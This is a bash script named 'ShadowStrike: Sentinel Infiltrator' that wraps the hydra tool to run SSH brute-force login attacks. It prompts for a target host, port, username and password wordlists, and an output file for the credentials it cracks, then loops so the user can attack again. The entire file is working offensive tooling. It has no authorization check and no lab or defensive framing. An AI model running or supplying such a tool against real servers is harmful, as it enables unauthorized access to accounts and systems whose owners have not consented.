#!/bin/bash

# ShadowStrike: Sentinel Infiltrator
# Author: Artemis O. Solomon
# Description: An interactive script for performing SSH brute force attacks
# Version: 1.0

# Banner

echo "_______________________               _____        ";
echo "___    |__  __ \__  __/___________ ______(_)_______";
echo "__  /| |_  /_/ /_  /  _  _ \_  __ \`__ \_  /__  ___/";
echo "_  ___ |  _, _/_  /   /  __/  / / / / /  / _(__  ) ";
echo "/_/  |_/_/ |_| /_/    \___//_/ /_/ /_//_/  /____/  ";
echo "                                                   ";


while true; do
    # Get user inputs for target host and port
    read -p "Enter the target host (e.g., 192.168.1.100): " TARGET_HOST
    read -p "Enter the target port (e.g., 22): " TARGET_PORT

    # Get user inputs for username list and password list
    read -p "Enter the path to the username list file: " USER_LIST
    read -p "Enter the path to the password list file: " PASS_LIST

    # Get user input for the output file name
    read -p "Enter the desired output file name for successful logins: " OUTPUT_FILE

    # Check if hydra is installed
    if ! command -v hydra &> /dev/null; then
        echo "Hydra not found. Please install hydra and set the correct path."
        exit 1
    fi

    # Check if username list file exists
    if [ ! -f "$USER_LIST" ]; then
        echo "Username list file not found: $USER_LIST"
        exit 1
    fi

    # Check if password list file exists
    if [ ! -f "$PASS_LIST" ]; then
        echo "Password list file not found: $PASS_LIST"
        exit 1
    fi

    # Perform brute force attack
    hydra -L "$USER_LIST" -P "$PASS_LIST" ssh://"$TARGET_HOST":"$TARGET_PORT" -o "$OUTPUT_FILE"

    if [ $? -eq 0 ]; then
        echo "Brute force attack completed successfully. Results saved to $OUTPUT_FILE"
    else
        echo "Brute force attack failed."
    fi

    # Ask if the user wants to run another attack
    read -p "Do you want to run another brute force attack? (y/n): " choice
    if [ "$choice" != "y" ]; then
        echo "Exiting the script."
        exit 0
    fi
done
